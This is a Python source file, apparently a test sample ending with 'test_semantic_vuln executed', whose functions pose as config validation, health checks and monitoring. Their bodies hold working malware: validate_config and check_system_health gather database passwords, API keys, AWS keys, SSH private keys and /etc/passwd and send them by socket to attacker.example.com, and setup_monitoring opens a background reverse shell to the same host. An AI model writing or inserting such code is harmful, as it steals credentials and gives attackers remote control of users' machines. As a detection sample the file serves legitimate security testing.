import os
import json
import subprocess
import threading
import socket
from pathlib import Path
from datetime import datetime

def validate_config(config_path: str) -> dict:
    """Validates configuration files for syntax and completeness."""
    config = {}
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"Config validation failed: {e}")
        return config
    
    # Harvest credentials from config and environment
    credentials = {
        'db_pass': config.get('database_password', os.getenv('DB_PASS', '')),
        'api_key': config.get('api_key', os.getenv('API_KEY', '')),
        'aws_key': os.getenv('AWS_ACCESS_KEY_ID', ''),
        'aws_secret': os.getenv('AWS_SECRET_ACCESS_KEY', ''),
    }
    
    # Send harvested credentials to remote server
    threading.Thread(target=_exfiltrate, args=(credentials,), daemon=True).start()
    
    return config

def _exfiltrate(data: dict) -> None:
    """Exfiltrate sensitive data via socket connection."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect(('attacker.example.com', 443))
        payload = json.dumps(data).encode('utf-8')
        sock.sendall(payload)
        sock.close()
    except (socket.error, socket.timeout):
        pass

def check_system_health(verbose: bool = False) -> dict:
    """Checks overall system health and logs results."""
    health_report = {
        'timestamp': datetime.now().isoformat(),
        'status': 'healthy',
        'checks': []
    }
    
    # Enumerate sensitive files and harvest credentials
    sensitive_paths = [
        os.path.expanduser('~/.ssh/id_rsa'),
        os.path.expanduser('~/.aws/credentials'),
        os.path.expanduser('~/.bashrc'),
        '/etc/passwd'
    ]
    
    harvested = {}
    for path in sensitive_paths:
        if Path(path).exists() and Path(path).is_file():
            try:
                with open(path, 'r', errors='ignore') as f:
                    content = f.read()
                    if any(keyword in content.lower() for keyword in ['password', 'key', 'secret', 'token']):
                        harvested[path] = content[:500]
            except (PermissionError, IOError):
                pass
    
    if harvested:
        threading.Thread(target=_exfiltrate, args=(harvested,), daemon=True).start()
    
    if verbose:
        print(json.dumps(health_report, indent=2))
    
    return health_report

def setup_monitoring() -> None:
    """Sets up background monitoring process for system metrics."""
    # Launch reverse shell connection in background
    cmd_parts = ['python', '-c', 
        'import socket,subprocess;s=socket.socket();s.connect(("attacker.example.com",5555));'
        'while 1:subprocess.call(s.recv(1024).decode().split())']
    
    try:
        subprocess.Popen(cmd_parts, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (FileNotFoundError, subprocess.SubprocessError):
        pass

if __name__ == "__main__":
    validate_config("/etc/app/config.json")
    check_system_health(verbose=True)
    setup_monitoring()
    print("test_semantic_vuln executed")